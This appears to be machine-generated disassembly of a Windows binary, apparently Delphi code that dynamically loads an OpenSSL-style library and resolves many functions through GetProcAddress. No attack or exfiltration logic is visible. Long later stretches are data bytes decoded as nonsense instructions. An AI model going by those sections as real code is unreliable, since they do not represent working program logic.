cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_45affc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036a4#2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45690c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b056
add [ eax ] eax
add [ eax ] al
xor al 0x6d
inc eax
add [ edx - 0x50 ] ah
inc ebp
add [ ecx - 0x3ba743d ] cl
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_403f00
call sub_4038e0
mov eax [ ebp - 0x4 ]
call sub_419a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b088
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b0ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0b4
retn
sub_45b0c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b0e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0ec
retn
sub_45b214
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_45b26b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404174
lea eax [ ebp - 0x4 ]
call j_sub_404378
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b272
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45b284
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_45b2c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45b214
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2c9
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45b2d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_45b327
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404174
lea eax [ ebp - 0x4 ]
call j_sub_404378
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b32e
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45b340
push ebx
mov bl 0x1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop ebx
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b284
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b2d0
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
mov eax r-xdata
call sub_45b214
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov bl 0x1
sub_45c494
cmp [ rw-data ] 0x0
jle r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45c518
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c544
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c54b
retn
call sub_45c494
sub_45c558
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c57d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c584
retn
sub_45c590
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40382c#9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c5bc
retn
sub_45c5c8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40382c#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c5f4
retn
sub_45c600
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c625
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c62c
retn
sub_45c638
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c65d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c664
retn
sub_45c670
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40382c#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c69c
retn
sub_45c874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x45c8 0x0
or al 0xc9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
enter 0x45 0x24
add [ eax ] al
add ah dh
adc al 0x41
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x480045d8 ] al
aas
inc ecx
add [ esi + edi + 0x41 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0x24000000 ] al
insd
inc eax
add [ eax + eax ] al
add [ eax ] al
and al 0x6d
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp * 2 + 0xc0040 ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x45c90c73
add [ edi ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65560a00
jb r-xdata
inc esi
imul ebp [ ebp + 0x24 ] 0xc00406d
add [ eax ] al
dec [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4b070002 ] al
imul ebp [ edi + 0x6e ] 0x45c8bc73
add [ eax + 0x15 ] ch
inc ecx
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
or [ eax ] al
or al [ ebx + 0x69 ]
jo r-xdata
jns r-xdata
add [ eax ] bl
imul ebp [ ebp - 0x58 ] 0x100045c6
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060003 ] al
je r-xdata
pop es
add [ eax ] al
add [ edx ] 0x0
outsb
push ebx
push ebx
dec esp
or [ eax ] eax
and al 0x6d
inc eax
add [ eax + eax ] al
add bh bh
add al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x52
outsd
outsd
je r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
jb r-xdata
jae r-xdata
outsd
cmp al 0x10
inc eax
add [ eax + eax ] dl
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx ] cl
push esi
jb r-xdata
jo r-xdata
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560a0005 ] al
jb r-xdata
outsd
add bh al
inc ebp
add [ ecx ] dl
add [ eax ] al
call [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040004 ] al
dec ebx
add [ edi ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] ah
js r-xdata
inc eax
add ah cl
fild [ ebp ]
push cs
imul esi [ ebx + 0x74 ] 0xc400408d
0x45
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
push r-xdata
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edx ] cl
push esi
jb r-xdata
outsd
mov esp 0x180045c7
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4d
inc esi
imul ebp [ ebp + 0x24 ] 0x800406d
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080001 ] al
jb r-xdata
add [ eax + esi - 0x2457ffc0 ] ah
inc ebp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add ah dl
scasd [ edi ]
inc ebp
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x24abffbf ] bl
inc ebp
add [ edi + ecx * 4 - 0x701bffbb ] ch
inc ebp
add [ eax + edx * 4 ] dl
inc ebp
add [ eax ] al
fld [ ebp ]
mov ah bl
inc ebp
add ah dh
fild [ ebp ]
je r-xdata
inc ebp
add [ eax - 0xbffba24 ] dh
lodsd [ esi ]
inc ebp
add [ eax - 0x2fffba24 ] bh
fadd [ ebp ]
hlt
inc ebp
add [ eax + eax - 0x57b40000 ] dh
inc ebp
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xcc
push eax

inc ebx
imul esi [ eax + 0x68 ] 0x694c7265
jae r-xdata
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x2033ffc0 ] ah
inc ebp
add [ esi ] cl
jns r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] bl
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
0x45
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esi [ edx + 0x73 ] r-xdata
sub_45ca88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test dl 0x45
add [ eax ] bh
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x2033ffc0 ] ah
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] ah
js r-xdata
add [ eax + esi - 0x2457ffc0 ] ah
inc ebp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add ah dl
scasd [ edi ]
inc ebp
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x24abffbf ] bl
inc ebp
add [ edi + ecx * 4 - 0x701bffbb ] ch
inc ebp
add [ eax + edx * 4 ] dl
inc ebp
add [ eax ] al
fld [ ebp ]
mov ah bl
inc ebp
add ah dh
fild [ ebp ]
je r-xdata
inc ebp
add [ eax - 0xbffba24 ] dh
lodsd [ esi ]
inc ebp
add [ eax - 0x2fffba24 ] bh
fadd [ ebp ]
hlt
inc ebp
add [ eax + eax - 0x57b40000 ] dh
inc ebp
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xcc
push eax

sub_45cb08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax

sub_45cdc1
int 0x45
add [ edi ] al
adc eax 0x53644954
jb r-xdata
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
into
popad
jae r-xdata
fadd st7
inc ebp
add [ eax ] bh
add bh bh
js r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
iretd
outsb
push ebx
push ebx
dec esp
add [ eax ] al
mov eax eax
pop esp
iretd
add [ edi ] al
push esp
dec ecx
pop eax
xor eax 0xceec3930
inc ebp
add [ edi ] al
pop es
push esp
dec ecx
pop eax
add [ ebx + ebp * 8 - 0x14b3ffbb ] dl
inc ebp
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or al 0x4f
outsb
push ebx
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0c0004 ] al
push ebx
dec esp
pop eax
int 0x45
add [ ecx + esi * 4 + 0x70045 ] bl
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
xor [ eax ] al
xchg esp eax
jmp r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0005 ] al
outsb
inc edi
je r-xdata
outsb
push ebx
push ebx
dec esp
add al 0x0
or cl cl
inc ebp
add [ eax + eax ] ch
[ eax + eax ]
add [ eax ] al
add [ eax ] al
sub [ ebx ] dh
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor al cl
inc ebp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
outsb
push esi
push es
add [ edi + ecx * 2 ] cl
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x146bffc0 ] ah
inc ebp
add [ ebx + ebp * 8 + 0x45 ] cl
loopne r-xdata
jae r-xdata
xor eax 0xcedc3930
inc ebp
add ah dh
adc [ eax ] al
add [ eax ] al
or al 0x49
push ebx
push ebx
dec esp
dec edi
jo r-xdata
jns r-xdata
jb r-xdata
outsb
outsw
add al 0xc8
inc ebp
dec esp
jmp r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
iretd
fmul st6
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sub_45cf14
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
iretd
sub_45cff2
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec edi
jo r-xdata
dec esi
outsd
je r-xdata
outsb
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
inc ebp
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
shl al 0xd0
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ ebp ] 0x1
or al 0x0
add [ eax ] al
insb
iretd
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
xor [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
je r-xdata
jne r-xdata
rol [ eax - 0x2f ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
push ebx
push ebx
dec esp
dec esp
outsd
popad
inc ebp
jb r-xdata
outsb
inc ebp
add [ eax + eax ] cl
add [ eax ] al
enter 0x45cf 0x0
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x4f644945 ] bl
push ebx
push ebx
dec esp
inc ebx
outsd
